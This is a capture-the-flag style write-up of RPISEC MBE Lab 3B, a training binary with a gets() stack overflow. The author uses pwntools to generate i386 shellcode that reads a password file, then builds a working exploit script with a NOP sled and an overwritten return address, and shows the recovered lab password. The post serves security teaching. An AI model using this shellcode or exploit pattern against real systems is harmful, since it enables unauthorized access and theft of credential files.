---
layout: post
title: Pwntools Shellcraft Fun - MBE Lab 3B Writeup
tags: 
- ctf
- writeups
- MBE
- shellcode
- pwntools
---

This writeup will be about [MBE's](https://github.com/RPISEC/MBE) Lab 3B. The lab itself is very simple, but I'm more interested in *how* I solved it using [Pwntools' Shellcraft](http://docs.pwntools.com/en/stable/shellcraft.html). This was the first time I've used shellcraft and I've found it extremely useful and preferable to crafting shellcode by hand. With that said, nothing can beat the accuracy and meticulousness of handcrafted shellcode.

---

For Lab 3B, we're given a binary (**lab3B**) and the corresponding source code:

**lab3B.c**
---

```c
#include <signal.h>
#include <assert.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/prctl.h>
#include <wait.h>
#include "utils.h"

ENABLE_TIMEOUT(60)

/* gcc -z execstack -fno-stack-protector -o lab3B lab3B.c */

/* hint: write shellcode that opens and reads the .pass file.
   ptrace() is meant to deter you from using /bin/sh shellcode */

int main()
{
    pid_t child = fork();
    char buffer[128] = {0};
    int syscall = 0;
    int status = 0;

    if(child == 0)
    {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);

        /* this is all you need to worry about */
        puts("just give me some shellcode, k");
        gets(buffer);
    }
    else
    {
        /* mini exec() sandbox, you can ignore this */
        while(1)
        {
            wait(&status);
            if (WIFEXITED(status) || WIFSIGNALED(status)){
                puts("child is exiting...");
                break;
            }

            /* grab the syscall # */
            syscall = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL);

            /* filter out syscall 11, exec */
            if(syscall == 11)
            {
                printf("no exec() for you\n");
                kill(child, SIGKILL);
                break;
            }
        }
    }

    return EXIT_SUCCESS;
}


```

Nothing too exciting to see here. Basically, we're given the hint that we should write shellcode to open and read the *.pass* file, since `ptrace` is preventing us from using `/bin/sh` shellcode. That's fine by me. Luckily, there's a [shellcraft function for reading files on an i386 Linux system](http://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.readfile).

Before we fire up an interactive Python session to test this out, let's look at the function header and arguments and discuss what we need to send in.

```python
pwnlib.shellcraft.i386.linux.readfile(path, dst='esi')
```

`Args: [path, dst (imm/reg) = esi ] Opens the specified file path and sends its content to the specified file descriptor.`

Since we want to read the `.pass` file of the next level, the full path of the `.pass` file is `/home/lab3A/.pass`. For `dst`, we need to give it a file descriptor. Then why not `stdout`? `stdout` is usually file descriptor `1`, so we'll set `dst=1` in our argument list. This gives us the following function call:

```python
pwnlib.shellcraft.i386.linux.readfile('/home/lab3A/.pass', 1)
```

Let's test it in an interactive Python session:

```python
Python 2.7.14 (default, Sep 25 2017, 09:53:22) 
[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.37)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> print pwnlib.shellcraft.i386.linux.readfile('/home/lab3A/.pass', 1)
    /* Save destination */
    push 1
    pop edi

    /* push '/home/lab3A/.pass\x00' */
    push 0x73
    push 0x7361702e
    push 0x2f413362
    push 0x616c2f65
    push 0x6d6f682f

    /* call open('esp', 'O_RDONLY') */
    push SYS_open /* 5 */
    pop eax
    mov ebx, esp
    xor ecx, ecx
    int 0x80

    /* Save file descriptor for later */
    mov ebp, eax

    /* call fstat('eax', 'esp') */
    mov ebx, eax
    push SYS_fstat /* 0x6c */
    pop eax
    mov ecx, esp
    int 0x80

    /* Get file size */
    add esp, 20
    mov esi, [esp]

    /* call sendfile('edi', 'ebp', 0, 'esi') */
    xor eax, eax
    mov al, 0xbb
    mov ebx, edi
    mov ecx, ebp
    cdq /* edx=0 */
    int 0x80

>>> 
```

In a nicer format, this is what the assembly comes out to be:

```asm
/* Save destination */
push 1
pop edi

/* push '/home/lab3A/.pass\x00' */
push 0x73
push 0x7361702e
push 0x2f413362
push 0x616c2f65
push 0x6d6f682f

/* call open('esp', 'O_RDONLY') */
push SYS_open /* 5 */
pop eax
mov ebx, esp
xor ecx, ecx
int 0x80

/* Save file descriptor for later */
mov ebp, eax

/* call fstat('eax', 'esp') */
mov ebx, eax
push SYS_fstat /* 0x6c */
pop eax
mov ecx, esp
int 0x80

/* Get file size */
add esp, 20
mov esi, [esp]

/* call sendfile('edi', 'ebp', 0, 'esi') */
xor eax, eax
mov al, 0xbb
mov ebx, edi
mov ecx, ebp
cdq /* edx=0 */
int 0x80
```

That looks beautiful! The only problem is that we need to use this as shellcode, meaning we need it in the form of bytes, not assembly instructions. Thankfully, pwntools also has [a handy function `asm()`](http://docs.pwntools.com/en/stable/asm.html#pwnlib.asm.asm) which converts assembly code into the raw bytes to be used as shellcode.

Let's try it out!

```python
Python 2.7.14 (default, Sep 25 2017, 09:53:22) 
[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.37)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> asm(pwnlib.shellcraft.i386.linux.readfile('/home/lab3A/.pass', 1))
'j\x01_jsh.pashb3A/he/lah/homj\x05X\x89\xe31\xc9\xcd\x80\x89\xc5\x89\xc3jlX\x89\xe1\xcd\x80\x83\xc4\x14\x8b4$1\xc0\xb0\xbb\x89\xfb\x89\xe9\x99\xcd\x80'
>>> 
```

Our final shellcode payload looks like:

```
j\x01_jsh.pashb3A/he/lah/homj\x05X\x89\xe31\xc9\xcd\x80\x89\xc5\x89\xc3jlX\x89\xe1\xcd\x80\x83\xc4\x14\x8b4$1\xc0\xb0\xbb\x89\xfb\x89\xe9\x99\xcd\x80
```

Now, all that's left to do is to craft our exploit. The size of the buffer is 128 bytes so we have plenty of space to work with. Let's make the entire buffer all NOPs and then our shellcode. In `gdb`, it looks like `bffff640` might be around the ballpark of where this buffer begins, so we overwrite the function return address with this address. In addition to this, it looks like there's 28 bytes between the end of the buffer and the return address we want to overwrite. Our shellcode comes out to be 62 bytes. Therefore, the following is what we want the stack to look like after we write to the buffer:

```
+------------------+
| \x90\x90\x90\x90 | <-- 0xbffff640 (approximately beginning of buffer)
+------------------+
| \x90\x90\x90\x90 |
+------------------+
| \x90\x90\x90\x90 |
+------------------+
| \x90\x90\x90\x90 |
+------------------+
        ...
+------------------+        
|\x90\x90 shellcode| <-- 0xbffff640 + 64 (Beginning of shellcode)
+------------------+
|    shellcode     |
+------------------+
|    shellcode     |
+------------------+
        ...
+------------------+
|    shellcode     |
+------------------+
|    shellcode     | <-- 0xbffff640 + 124
+------------------+
|      ??????      | <-- 0xbffff640 + 128
+------------------+
|      ??????      | <-- 0xbffff640 + 132
+------------------+
|      ??????      | <-- 0xbffff640 + 136
+------------------+
|      ??????      | <-- 0xbffff640 + 140
+------------------+
|      ??????      | <-- 0xbffff640 + 144
+------------------+
|      ??????      | <-- 0xbffff640 + 148
+------------------+
|      ??????      | <-- 0xbffff640 + 152
+------------------+
| \xbf\xff\xf6\x40 | <-- 0xbffff640 + 156
+------------------+
```

Our final exploit looks like the following (remember to take into account endianness):

```python
import sys

shellcode = 'j\x01_jsh.pashb3A/he/lah/homj\x05X\x89\xe31\xc9\xcd\x80\x89\xc5\x89\xc3jlX\x89\xe1\xcd\x80\x83\xc4\x14\x8b4$1\xc0\xb0\xbb\x89\xfb\x89\xe9\x99\xcd\x80'

LEN_BEG = 128
END_SLED = '\x90'*28
RET_ADDR = '\x40\xf6\xff\xbf'

NOP_SLED = '\x90'*(LEN_BEG - len(shellcode)) 
PAYLOAD = NOP_SLED + shellcode + END_SLED + RET_ADDR

sys.stdout.write(PAYLOAD)
```

When we run it, we're able to get the password printed to stdout:

```sh
$ python lab3B.py | ./lab3B
just give me some shellcode, k
wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
```

And we get our password for Lab 3A:

```
wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
```
